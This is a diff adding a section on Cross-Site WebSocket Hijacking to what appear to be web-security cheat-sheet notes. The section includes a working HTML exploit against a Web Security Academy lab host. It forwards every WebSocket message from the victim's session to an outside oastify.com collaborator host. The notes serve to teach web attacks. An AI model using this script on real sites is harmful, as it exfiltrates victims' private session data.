@@ -362,3 +362,30 @@ Some applications validate the `Referer` header in a naive way that can be bypas
 </html>
 ```
 > **Note**: Some browsers strips the referer headers, to avoid that add the following header on the malicious server response `Referrer-Policy: unsafe-url`.
+
+# Cross-Site WebSocket Hijacking
+
+CSWH or Cross-Site Websocket hijacking involves a cross-site request forquery vulnerability on a WebSocket handshake. It arises when the websocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens.
+
+An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application. 
+
+Example of exploit:
+
+```html
+<script>
+var ws = new WebSocket("wss://0a45008904e7cbd3804cf37400bc00b0.web-security-academy.net/chat");
+ws.onopen = function() {
+    console.log("Conectado al WebSocket");
+    ws.send("READY");
+};
+ws.onmessage = function(event) {
+    console.log("Mensaje del servidor:", event.data);
+
+    fetch("https://hf02g7im3afdf7eyw0yv7yibe2kx8rwg.oastify.com/test", {
+        method: "POST",
+        mode: "no-cors",
+        body: event.data
+        })
+};
+</script>
+```
